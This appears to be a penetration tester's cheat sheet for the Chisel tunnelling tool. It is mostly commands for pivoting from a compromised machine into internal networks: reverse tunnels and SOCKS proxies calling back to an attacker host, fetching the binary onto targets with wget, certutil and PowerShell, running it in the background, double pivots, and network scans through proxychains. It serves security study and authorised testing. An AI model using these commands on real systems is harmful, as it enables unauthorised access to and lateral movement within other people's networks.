# Chisel - Fast TCP/UDP Tunnel over HTTP

**Author:** Julien Bongars\
**Date:** 2025-12-30 00:02:04
**Path:**

---

## Overview

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. It's especially useful for pivoting through firewalls and NAT. Single executable, works on Linux, Windows, and macOS.

**GitHub**: https://github.com/jpillora/chisel

## Installation

### Download Pre-compiled Binaries

```bash
# Latest release
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

# For Windows targets
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

### Build from Source

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```

## Basic Concepts

### Server vs Client

- **Server**: Runs on your attacking machine (has public/accessible IP)
- **Client**: Runs on compromised target machine (connects back to server)

### Forward vs Reverse

- **Forward Tunnel (Local)**: Client forwards local port to remote destination
- **Reverse Tunnel (Remote)**: Server forwards its local port to client's network

## Common Usage Patterns

### Pattern 1: Reverse Tunnel (Most Common)

**Scenario**: You compromise a target and want to access services on its internal network.

```bash
# On your attacking machine (Server)
chisel server -p 8000 --reverse

# On compromised target (Client)
chisel client {ATTACKER_IP}:8000 R:8080:127.0.0.1:80

# Now access target's localhost:80 via attacker's localhost:8080
curl http://127.0.0.1:8080
```

### Pattern 2: Forward Tunnel

**Scenario**: Less common, but useful when client needs to access attacker's services.

```bash
# On your attacking machine (Server)
chisel server -p 8000

# On compromised target (Client)
chisel client {ATTACKER_IP}:8000 8080:127.0.0.1:80

# Target can now access attacker's localhost:80 via target's localhost:8080
```

## Reverse Tunnel Examples (Most Useful)

### Access Internal Web Service

```bash
# Server (Attacker)
chisel server -p 8000 --reverse

# Client (Target)
chisel client {ATTACKER_IP}:8000 R:8080:localhost:80

# Access via browser: http://127.0.0.1:8080
```

### Access RDP on Internal Host

```bash
# Server (Attacker)
chisel server -p 8000 --reverse

# Client (Target - has access to 192.168.1.10)
chisel client {ATTACKER_IP}:8000 R:3389:192.168.1.10:3389

# Connect to RDP
xfreerdp /v:127.0.0.1:3389 /u:administrator /p:password
```

### Access SSH on Internal Network

```bash
# Server (Attacker)
chisel server -p 8000 --reverse

# Client (Target)
chisel client {ATTACKER_IP}:8000 R:2222:192.168.1.50:22

# SSH to internal host
ssh user@127.0.0.1 -p 2222
```

### Multiple Port Forwards

```bash
# Server (Attacker)
chisel server -p 8000 --reverse

# Client (Target) - Forward multiple ports
chisel client {ATTACKER_IP}:8000 R:8080:localhost:80 R:3389:192.168.1.10:3389 R:2222:192.168.1.20:22
```

### SOCKS5 Proxy (Dynamic Port Forwarding)

```bash
# Server (Attacker)
chisel server -p 8000 --reverse

# Client (Target)
chisel client {ATTACKER_IP}:8000 R:socks

# Configure proxychains or browser to use SOCKS5 proxy at 127.0.0.1:1080
# Edit /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# Use with tools
proxychains nmap -sT 192.168.1.0/24
proxychains curl http://192.168.1.10
```

## Advanced Usage

### Authentication

```bash
# Server with authentication
chisel server -p 8000 --reverse --auth user:password

# Client with authentication
chisel client --auth user:password {ATTACKER_IP}:8000 R:8080:localhost:80
```

### Custom SOCKS Port

```bash
# Server
chisel server -p 8000 --reverse

# Client (SOCKS on port 9050 instead of default 1080)
chisel client {ATTACKER_IP}:8000 R:9050:socks
```

### Bind to Specific Interface

```bash
# Server listening on all interfaces
chisel server -p 8000 --host 0.0.0.0 --reverse

# Server listening only on localhost
chisel server -p 8000 --host 127.0.0.1 --reverse
```

### Keep Alive Settings

```bash
# Client with keepalive (useful for unstable connections)
chisel client --keepalive 25s {ATTACKER_IP}:8000 R:8080:localhost:80

# Server with keepalive
chisel server -p 8000 --keepalive 25s --reverse
```

### Verbose Mode (Debugging)

```bash
# Server with verbose output
chisel server -p 8000 --reverse -v

# Client with verbose output
chisel client -v {ATTACKER_IP}:8000 R:8080:localhost:80
```

## File Transfer Methods

### Transfer to Linux Target

```bash
# HTTP Server on attacker
python3 -m http.server 80

# On target
wget http://{ATTACKER_IP}/chisel
chmod +x chisel

# Or using curl
curl http://{ATTACKER_IP}/chisel -o chisel
chmod +x chisel
```

### Transfer to Windows Target

```powershell
# PowerShell download
Invoke-WebRequest -Uri http://{ATTACKER_IP}/chisel.exe -OutFile C:\Windows\Temp\chisel.exe

# Or certutil
certutil -urlcache -f http://{ATTACKER_IP}/chisel.exe C:\Windows\Temp\chisel.exe

# Or via SMB
copy \\{ATTACKER_IP}\share\chisel.exe C:\Windows\Temp\
```

## Background Execution

### Linux Background

```bash
# Run in background with nohup
nohup ./chisel client {ATTACKER_IP}:8000 R:8080:localhost:80 &

# Run in background with disown
./chisel client {ATTACKER_IP}:8000 R:8080:localhost:80 &
disown

# Using screen or tmux
screen -dmS chisel ./chisel client {ATTACKER_IP}:8000 R:8080:localhost:80
```

### Windows Background

```powershell
# Start as background process
Start-Process -NoNewWindow -FilePath "C:\Windows\Temp\chisel.exe" -ArgumentList "client {ATTACKER_IP}:8000 R:8080:localhost:80"

# Or using cmd
start /B chisel.exe client {ATTACKER_IP}:8000 R:8080:localhost:80
```

## Practical Scenarios

### Scenario 1: Double Pivot

```bash
# First pivot (Target A)
# Server on Attacker
chisel server -p 8000 --reverse

# Client on Target A (can access Target B network)
chisel client {ATTACKER_IP}:8000 R:9001:localhost:9001

# Second pivot (Target B)
# Server on Target A
chisel server -p 9001 --reverse

# Client on Target B
chisel client 127.0.0.1:9001 R:3389:192.168.2.10:3389

# Now RDP accessible on Attacker at 127.0.0.1:3389
```

### Scenario 2: Access Multiple Internal Services

```bash
# Server on Attacker
chisel server -p 8000 --reverse

# Client on Target
chisel client {ATTACKER_IP}:8000 \
  R:8080:web-server.internal:80 \
  R:8443:web-server.internal:443 \
  R:3389:dc.internal:3389 \
  R:1433:sql.internal:1433 \
  R:5432:postgres.internal:5432
```

### Scenario 3: Combine with Metasploit

```bash
# Chisel SOCKS proxy
# Server
chisel server -p 8000 --reverse

# Client
chisel client {ATTACKER_IP}:8000 R:socks

# Metasploit configuration
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run

# Or route through existing session
route add 192.168.1.0 255.255.255.0 {SESSION_ID}
```

## Comparison with SSH Tunneling

### SSH Local Forward (-L)

```bash
# SSH
ssh -L 8080:internal-host:80 user@jump-host

# Chisel equivalent (reverse)
chisel server -p 8000 --reverse
chisel client attacker:8000 R:8080:internal-host:80
```

### SSH Remote Forward (-R)

```bash
# SSH
ssh -R 8080:localhost:80 user@external-host

# Chisel equivalent (forward)
chisel server -p 8000
chisel client external-host:8000 8080:localhost:80
```

### SSH Dynamic Forward (-D)

```bash
# SSH
ssh -D 1080 user@jump-host

# Chisel equivalent
chisel server -p 8000 --reverse
chisel client attacker:8000 R:socks
```

## Troubleshooting

### Connection Issues

```bash
# Check if server is listening
netstat -tulpn | grep 8000

# Test connectivity
nc -zv {ATTACKER_IP} 8000

# Firewall rules (if needed)
ufw allow 8000/tcp
iptables -A INPUT -p tcp --dport 8000 -j ACCEPT
```

### Port Already in Use

```bash
# Find what's using the port
lsof -i :8000
netstat -tulpn | grep 8000

# Kill the process
kill -9 {PID}

# Or use different port
chisel server -p 8001 --reverse
```

### Windows Firewall Issues

```powershell
# Allow through Windows Firewall
New-NetFirewallRule -DisplayName "Chisel" -Direction Outbound -Action Allow -Protocol TCP -RemotePort 8000
```

### Slow Performance

```bash
# Increase buffer size
chisel client --max-retry-count 10 {ATTACKER_IP}:8000 R:8080:localhost:80

# Check bandwidth
iperf3 -c {ATTACKER_IP}
```

## Security Considerations

- Chisel traffic is encrypted via SSH
- Always use authentication in production environments
- Consider using HTTPS for additional obfuscation
- Monitor for unusual outbound connections on port 8000 (or your chosen port)
- Clean up chisel binaries after engagement

## Quick Reference

### Most Common Command

```bash
# Server (run this first on attacker)
chisel server -p 8000 --reverse

# Client (run this on target)
chisel client {ATTACKER_IP}:8000 R:{LOCAL_PORT}:{TARGET_HOST}:{TARGET_PORT}
```

### SOCKS Proxy (Scan entire network)

```bash
# Server
chisel server -p 8000 --reverse

# Client
chisel client {ATTACKER_IP}:8000 R:socks

# Use with proxychains
proxychains nmap -sT -Pn 192.168.1.0/24
```
